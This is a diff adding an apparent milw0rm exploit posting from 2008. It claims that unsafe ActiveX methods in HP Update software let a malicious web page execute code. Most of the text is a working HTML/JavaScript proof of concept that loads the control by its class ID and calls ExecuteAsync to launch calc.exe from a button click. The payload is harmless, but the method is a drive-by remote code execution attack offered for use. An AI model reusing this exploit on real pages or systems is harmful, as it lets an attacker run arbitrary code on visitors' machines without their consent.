@@ -1,0 +1,35 @@
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+Insecure Methods in HP Update Software.
+Remote: Yes
+Execute code remotely is possible using methods ExecuteAsync and Execute  :-) 
+If a user visits the malicious page the attacker can execute code.
+Coded by callAX
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+Proof of Concept
+----------------
+
+
+<HTML>
+<BODY>
+<object id=boom classid="clsid:{B00FBC78-73CB-4216-8D01-96770CC020C3}"></object>
+<SCRIPT language="javascript">
+
+
+function Do_it()
+{
+  var Please = "c:\\windows\\system32\\calc.exe"
+  var Give = "doest_matter"
+  var Me = "c:\\"
+  var Freedom  = 1;
+
+  boom.ExecuteAsync (Please, Give, Me ,Freedom);
+}
+
+
+</SCRIPT>
+<input language=JavaScript onclick=Do_it() type=button value="Poc">
+</BODY>
+</HTML>
+
+# milw0rm.com [2008-04-27]
